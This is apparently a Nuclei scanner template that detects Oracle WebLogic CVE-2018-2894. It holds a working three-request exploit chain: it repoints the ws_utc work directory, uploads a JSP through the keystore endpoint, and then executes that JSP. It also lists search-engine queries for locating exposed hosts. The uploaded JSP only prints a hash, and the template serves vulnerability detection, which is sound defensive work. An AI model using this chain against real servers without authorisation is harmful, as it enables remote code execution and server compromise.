http:
- extractors:
  - group: 1
    internal: true
    name: id
    regex:
    - <keyStoreItem><id>([0-9]+)</id><name>{{randstr}}
    type: regex
  matchers:
  - type: word
    words:
    - 26ec00a3a03f6bfc5226fd121567bb58
  raw:
  - 'POST /ws_utc/resources/setting/options HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    setting_id=general&BasicConfigOptions.workDir=%2Fu01%2Foracle%2Fuser_projects%2Fdomains%2Fbase_domain%2Fservers%2FAdminServer%2Ftmp%2F_WL_internal%2Fcom.oracle.webservices.wls.ws-testclient-app-wls%2F4mcj4y%2Fwar%2Fcss&BasicConfigOptions.proxyHost=&BasicConfigOptions.proxyPort=80

    '
  - "POST /ws_utc/resources/setting/keystore HTTP/1.1\nHost: {{Hostname}}\nContent-Type:\
    \ multipart/form-data; boundary=----WebKitFormBoundaryuim0dyiDSPBPu31g\n\n------WebKitFormBoundaryuim0dyiDSPBPu31g\n\
    Content-Disposition: form-data; name=\"ks_name\"\n\n{{randstr}}\n------WebKitFormBoundaryuim0dyiDSPBPu31g\n\
    Content-Disposition: form-data; name=\"ks_edit_mode\"\n\nfalse\n------WebKitFormBoundaryuim0dyiDSPBPu31g\n\
    Content-Disposition: form-data; name=\"ks_password_front\"\n\n\n------WebKitFormBoundaryuim0dyiDSPBPu31g\n\
    Content-Disposition: form-data; name=\"ks_password\"\n\n\n------WebKitFormBoundaryuim0dyiDSPBPu31g\n\
    Content-Disposition: form-data; name=\"ks_password_changed\"\n\nfalse\n------WebKitFormBoundaryuim0dyiDSPBPu31g\n\
    Content-Disposition: form-data; name=\"ks_filename\"; filename=\"{{randstr}}.jsp\"\
    \nContent-Type: application/octet-stream\n\n<%@ page import=\"java.util.*,java.io.*\"\
    %>\n<%@ page import=\"java.security.MessageDigest\"%>\n\n<%\nString cve = \"CVE-2018-2894\"\
    ;\nMessageDigest alg = MessageDigest.getInstance(\"MD5\");\nalg.reset();\nalg.update(cve.getBytes());\n\
    byte[] digest = alg.digest();\nStringBuffer hashedpasswd = new StringBuffer();\n\
    String hx;\nfor (int i=0;i<digest.length;i++){\n  hx =  Integer.toHexString(0xFF\
    \ & digest[i]);\n  //0x03 is equal to 0x3, but we need 0x03 for our md5sum\n \
    \ if(hx.length() == 1){hx = \"0\" + hx;}\n  hashedpasswd.append(hx);\n}\n\nout.println(hashedpasswd.toString());\n\
    %>\n------WebKitFormBoundaryuim0dyiDSPBPu31g--\n"
  - 'GET /ws_utc/css/config/keystore/{{id}}_{{randstr}}.jsp HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2018-2894
info:
  author: geeknik,pdteam
  classification:
    cpe: cpe:2.3:a:oracle:weblogic_server:10.3.6.0.0:*:*:*:*:*:*:*
    cve-id: CVE-2018-2894
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    epss-percentile: 0.99938
    epss-score: 0.94295
  description: 'The Oracle WebLogic Server component of Oracle Fusion Middleware (subcomponent:
    WLS - Web Services) is susceptible to a remote code execution vulnerability that
    is easily exploitable and could allow unauthenticated attackers with network access
    via HTTP to compromise the server. Supported versions that are affected are 12.1.3.0,
    12.2.1.2 and 12.2.1.3.

    '
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    execute arbitrary code on the affected system.

    '
  metadata:
    fofa-query: title="oracle peoplesoft sign-in"
    google-query: intitle:"oracle peoplesoft sign-in"
    max-request: 3
    product: weblogic_server
    shodan-query:
    - http.title:"oracle peoplesoft sign-in"
    - product:"oracle weblogic"
    vendor: oracle
  name: Oracle WebLogic Server - Remote Code Execution
  reference:
  - https://blog.detectify.com/2018/11/14/technical-explanation-of-cve-2018-2894-oracle-weblogic-rce/
  - https://github.com/vulhub/vulhub/tree/fda47b97c7d2809660a4471539cd0e6dbf8fac8c/weblogic/CVE-2018-2894
  - https://nvd.nist.gov/vuln/detail/CVE-2018-2894
  - http://www.oracle.com/technetwork/security-advisory/cpujul2018-4258247.html
  - http://www.securitytracker.com/id/1041301
  remediation: 'Apply the latest security patches provided by Oracle to mitigate this
    vulnerability.

    '
  severity: critical
  tags: cve2018,cve,oracle,weblogic,rce,vulhub,intrusive,vkev,vuln
